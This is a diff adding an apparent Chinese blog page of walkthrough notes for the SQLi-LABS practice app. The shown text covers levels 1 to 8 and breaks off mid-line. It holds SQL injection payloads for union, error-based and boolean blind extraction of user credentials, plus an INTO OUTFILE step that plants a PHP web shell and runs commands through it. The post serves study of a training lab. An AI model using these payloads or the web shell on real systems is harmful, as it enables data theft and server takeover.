@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SQLi-LABS 1-65的通关笔记。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-LABS通关笔记">
+<meta property="og:url" content="http://example.com/2023/12/21/SQLi-LABS%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQLi-LABS 1-65的通关笔记。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-21T11:23:25.000Z">
+<meta property="article:modified_time" content="2024-01-07T13:10:27.428Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SQLi-LABS通关笔记">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2023/12/21/SQLi-LABS%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2023/12/21/SQLi-LABS%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","path":"2023/12/21/SQLi-LABS通关笔记/","title":"SQLi-LABS通关笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQLi-LABS通关笔记 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLi-LABS"><span class="nav-number">1.</span> <span class="nav-text">SQLi-LABS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HackBar%E6%89%A9%E5%B1%95"><span class="nav-number">1.2.</span> <span class="nav-text">HackBar扩展</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLi-LABS%E5%85%B3%E5%8D%A1%E6%80%9D%E8%B7%AF%E4%B8%8E%E8%A7%A3%E6%B3%95"><span class="nav-number">1.3.</span> <span class="nav-text">SQLi-LABS关卡思路与解法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-1%E3%80%81Less-2%E3%80%81Less-3%E3%80%81Less-4"><span class="nav-number">1.3.1.</span> <span class="nav-text">Less-1、Less-2、Less-3、Less-4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-5%E3%80%81Less-6%EF%BC%88%E6%8A%A5%E9%94%99%EF%BC%89"><span class="nav-number">1.3.2.</span> <span class="nav-text">Less-5、Less-6（报错）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-7%E3%80%81Less-8%EF%BC%88%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="nav-number">1.3.3.</span> <span class="nav-text">Less-7、Less-8（文件写入、布尔盲注）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-9%E3%80%81Less-10%EF%BC%88%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="nav-number">1.3.4.</span> <span class="nav-text">Less-9、Less-10（时间盲注）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-11%E3%80%81Less-12"><span class="nav-number">1.3.5.</span> <span class="nav-text">Less-11、Less-12</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-13%E3%80%81Less-14%E3%80%81Less-15%E3%80%81Less-16%EF%BC%88%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.3.6.</span> <span class="nav-text">Less-13、Less-14、Less-15、Less-16（布尔注入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-17%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.3.7.</span> <span class="nav-text">Less-17（报错注入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-18%E3%80%81Less-19%EF%BC%88%E8%AF%B7%E6%B1%82%E5%A4%B4%EF%BC%89"><span class="nav-number">1.3.8.</span> <span class="nav-text">Less-18、Less-19（请求头）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-20%EF%BC%88Cookie%EF%BC%89"><span class="nav-number">1.3.9.</span> <span class="nav-text">Less-20（Cookie）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-21%E3%80%81Less-22%EF%BC%88%E7%BC%96%E7%A0%81%E3%80%81Cookie%EF%BC%89"><span class="nav-number">1.3.10.</span> <span class="nav-text">Less-21、Less-22（编码、Cookie）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-23"><span class="nav-number">1.3.11.</span> <span class="nav-text">Less-23</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-24%EF%BC%88%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.3.12.</span> <span class="nav-text">Less-24（二次注入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-25%E3%80%81Less-25a"><span class="nav-number">1.3.13.</span> <span class="nav-text">Less-25、Less-25a</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-26%E3%80%81Less-26a%E3%80%81Less-27%E3%80%81Less-27a%E3%80%81Less-28%E3%80%81Less-28a"><span class="nav-number">1.3.14.</span> <span class="nav-text">Less-26、Less-26a、Less-27、Less-27a、Less-28、Less-28a</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-29%E3%80%81Less-30%E3%80%81Less-31"><span class="nav-number">1.3.15.</span> <span class="nav-text">Less-29、Less-30、Less-31</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-32%E3%80%81Less-33%E3%80%81Less-34%EF%BC%88%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.3.16.</span> <span class="nav-text">Less-32、Less-33、Less-34（宽字节注入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-35%E3%80%81Less-36%E3%80%81Less-37"><span class="nav-number">1.3.17.</span> <span class="nav-text">Less-35、Less-36、Less-37</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-38%E3%80%81Less-39%E3%80%81Less-40%E3%80%81Less-41%EF%BC%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.3.18.</span> <span class="nav-text">Less-38、Less-39、Less-40、Less-41（堆叠注入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-42%E3%80%81Less-43%E3%80%81Less-44%E3%80%81Less-45"><span class="nav-number">1.3.19.</span> <span class="nav-text">Less-42、Less-43、Less-44、Less-45</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-46%E3%80%81Less-47"><span class="nav-number">1.3.20.</span> <span class="nav-text">Less-46、Less-47</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-48%E3%80%81Less-49%E3%80%81Less-50%E3%80%81Less-51%E3%80%81Less-52%E3%80%81Less-53"><span class="nav-number">1.3.21.</span> <span class="nav-text">Less-48、Less-49、Less-50、Less-51、Less-52、Less-53</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-54"><span class="nav-number">1.3.22.</span> <span class="nav-text">Less-54</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-55%E3%80%81Less-56%E3%80%81Less-57"><span class="nav-number">1.3.23.</span> <span class="nav-text">Less-55、Less-56、Less-57</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-58%E3%80%81Less-59%E3%80%81Less-60%E3%80%81Less-61"><span class="nav-number">1.3.24.</span> <span class="nav-text">Less-58、Less-59、Less-60、Less-61</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-62%E3%80%81Less-63%E3%80%81Less-64%E3%80%81Less-65"><span class="nav-number">1.3.25.</span> <span class="nav-text">Less-62、Less-63、Less-64、Less-65</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/21/SQLi-LABS%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQLi-LABS通关笔记 | Hexo">
+      <meta itemprop="description" content="SQLi-LABS 1-65的通关笔记。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQLi-LABS通关笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-12-21 19:23:25" itemprop="dateCreated datePublished" datetime="2023-12-21T19:23:25+08:00">2023-12-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-01-07 21:10:27" itemprop="dateModified" datetime="2024-01-07T21:10:27+08:00">2024-01-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">SQLi-LABS 1-65的通关笔记。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="SQLi-LABS"><a href="#SQLi-LABS" class="headerlink" title="SQLi-LABS"></a>SQLi-LABS</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>sqli-labs是一个用于学习和练习SQL注入漏洞的开源项目。它提供了一系列的漏洞场景和练习题目，帮助开发者和安全研究人员了解和掌握SQL注入攻击的原理和方法。通过sqli-labs，用户可以在一个安全的环境中进行SQL注入漏洞的测试和学习，以提高其对于网络安全的认识和技能。</p>
+<h3 id="HackBar扩展"><a href="#HackBar扩展" class="headerlink" title="HackBar扩展"></a>HackBar扩展</h3><p>由于GET请求是直接在地址栏中显示的，所以我们也是在地址栏中进行操作的，可是这样有点不方便，可以解压 hackbar-2.3.1-fx.xpi.zip 文件，并把它加入火狐浏览器的扩展中。</p>
+<blockquote>
+<p>如果你觉得在地址栏中进行操作没有不方便，可以忽略不安装这个火狐扩展。</p>
+</blockquote>
+<p>Load URL : 是将地址栏中的地址复制到方框中</p>
+<p>Split URL : 是截断URL，不怎么用，忽略即可</p>
+<p>Execute : 就是执行方框中的地址，执行后会刷新一下页面</p>
+<h3 id="SQLi-LABS关卡思路与解法"><a href="#SQLi-LABS关卡思路与解法" class="headerlink" title="SQLi-LABS关卡思路与解法"></a>SQLi-LABS关卡思路与解法</h3><h4 id="Less-1、Less-2、Less-3、Less-4"><a href="#Less-1、Less-2、Less-3、Less-4" class="headerlink" title="Less-1、Less-2、Less-3、Less-4"></a>Less-1、Less-2、Less-3、Less-4</h4><p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>存在id为1的记录，会显示id为1的用户名和密码，否则无显示</p>
+<p>寻找注入点，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 -- - </span><br><span class="line">?id=0&#x27; or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-1 正常显示，存在闭合点，闭合方式为 单引号</span><br><span class="line"></span><br><span class="line">?id=1 and 1=1 -- - </span><br><span class="line">?id=0 or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-2 正常显示，不存在闭合点，闭合方式为 直接拼接</span><br><span class="line"></span><br><span class="line">?id=1&#x27;) and 1=1 -- - </span><br><span class="line">?id=0&#x27;) or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-3 正常显示，存在闭合点，闭合方式为 单引号+括号</span><br><span class="line"></span><br><span class="line">?id=1&quot;) and 1=1 -- - </span><br><span class="line">?id=0&quot;) or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-3 正常显示，存在闭合点，闭合方式为 双引号+括号</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注入过程都差不多，所以下面都以 Less-1 为例</p>
+</blockquote>
+<p>判断列数及回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 9,8,7 -- -</span><br><span class="line"></span><br><span class="line">回显位是8和7</span><br></pre></td></tr></table></figure>
+
+<p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0&#x27; union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-5、Less-6（报错）"><a href="#Less-5、Less-6（报错）" class="headerlink" title="Less-5、Less-6（报错）"></a>Less-5、Less-6（报错）</h4><p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>存在id为1的记录，会显示显示<code>You are in...........</code>，否则无显示</p>
+<p>寻找注入点，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 -- - </span><br><span class="line">?id=0&#x27; or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-5 正常显示，存在闭合点，闭合方式为 单引号</span><br><span class="line"></span><br><span class="line">?id=1&quot; and 1=1 -- - </span><br><span class="line">?id=0&quot; or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-6 正常显示，存在闭合点，闭合方式为 双引号</span><br></pre></td></tr></table></figure>
+
+<p>因为前端不显示数据，只显示两种结果，所以使用 <strong>报错注入</strong></p>
+<blockquote>
+<p>过程都差不多，所以以 Less-5 为例</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"></span><br><span class="line">会显示这个数据库的报错，并且显示了 user() 这个用户名信息，可以进行报错注入</span><br></pre></td></tr></table></figure>
+
+<p>报错注入获取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前的数据库名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名（extractvalue()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))) -- -</span><br><span class="line"></span><br><span class="line"># 查询当前数据库中的所有表名（updatexml()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据（extractvalue()和updatexml()都有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(id) from security.users),0x7e))) -- -</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users where id=&#x27;1&#x27;),0x7e),1) -- -</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-7、Less-8（文件写入、布尔盲注）"><a href="#Less-7、Less-8（文件写入、布尔盲注）" class="headerlink" title="Less-7、Less-8（文件写入、布尔盲注）"></a>Less-7、Less-8（文件写入、布尔盲注）</h4><p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>存在id为1的记录，Less-7 会显示<code>You are in.... Use outfile......</code>，Less-8 会显示<code>You are in...........</code></p>
+<p>不存在id为0的记录，Less-7 会显示<code>You have an error in your SQL syntax</code>，Less-8 无显示</p>
+<p>寻找注入点，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and 1=1 -- - </span><br><span class="line">?id=0&#x27;)) or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-7 正常显示，存在闭合点，闭合方式为 单引号+括号+括号</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and 1=1 -- - </span><br><span class="line">?id=0&#x27; or 1=1 -- - </span><br><span class="line"></span><br><span class="line">Less-8 正常显示，存在闭合点，闭合方式为 单引号</span><br></pre></td></tr></table></figure>
+
+<p>Less-7的话，本意是要利用文件写入函数的，所以在这里说一下思路。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)) union select 9,database(),&quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;C:\\z2\\phpstudy_pro\\WWW\\1.php&quot;  -- -</span><br><span class="line"></span><br><span class="line"># 写一个1.php的文件到C:\z2\phpstudy_pro\WWW\目录下。phpinfo()函数的作用是显示php的信息</span><br><span class="line"></span><br><span class="line">?id=0&#x27;)) union select 8,database(),&quot;&lt;?php @system($_GET[abc]);  ?&gt;&quot; into outfile &quot;C:\\z2\\phpstudy_pro\\WWW\\2.php&quot;  -- -</span><br><span class="line"></span><br><span class="line"># 写一个1.php的文件到C:\z2\phpstudy_pro\WWW\目录下。@system($_GET[abc])的作用是执行通过GET请求传abc这个参的值</span><br><span class="line"></span><br><span class="line">2.php?abc=dir</span><br><span class="line"></span><br><span class="line"># 查看当前目录</span><br><span class="line"></span><br><span class="line">2.php?abc=dir /s /b &quot;C:/z2/phpstudy_pro/WWW/sqli&quot;</span><br><span class="line"></span><br><span class="line"># 搜索指定目录及其子目录中的文件</span><br><span class="line"></span><br><span class="line">2.php?abc=type &quot;C:\z2\phpstudy_pro\WWW\sqli\Less-7\index.php&quot; &gt;&gt; &quot;C:\z2\phpstudy_pro\WWW\sqli\Less-7\1.text&quot;</span><br><span class="line"></span><br><span class="line"># 复制Less-7关卡的代码，然后通过查看1.text得到源码。</span><br><span class="line"></span><br><span class="line"># 得到源码后可以根据源码写一个新的php文件，将查询到的数据返回给前端</span><br></pre></td></tr></table></figure>
+
+<p>Less-8</p>
+<p>因为前端不显示数据，只显示两种结果，所以使用 <strong>报错注入</strong>。</p>
+<p>经常测试，后台对数据库的报错进行了处理，不能进行报错注入。</p>
+<p>所以使用 <strong>布尔盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and length(database())=8 -- -</span><br><span class="line"># 通过布尔盲注，得出当前使用的数据库的长度为8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and ascii(substr(database(),1,1))=115 -- -</span><br><span class="line"># 通过布尔盲注，得出当前使用的数据库的名字的第一个字符是s，&#x27;s&#x27;的ascii码是0x73、115</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105 -- -</span><br><span class="line"># 通过布尔盲注，得出所有数据库名称拼接成的字符串的第一个字符是i，&#x27;i&#x27;的ascii码是0x69、105</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1))=101 -- -</span><br><span class="line"># 查询security数据库中的所有表名</span><br><span class="line"># ascii:0x65、101、e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),1,1))=105 -- -</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span 